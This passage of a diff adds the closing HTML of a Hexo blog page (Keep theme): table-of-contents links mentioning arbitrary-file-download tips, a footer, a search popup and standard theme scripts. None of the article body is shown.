href="#%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.2.2.</span> <span class="nav-text">从远程服务器下载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDtips"><span class="nav-number">3.</span> <span class="nav-text">三、实现中遇到的任意文件下载tips</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">白给</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+            <div class="deploy-info info-item">
+                
+                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                
+            </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
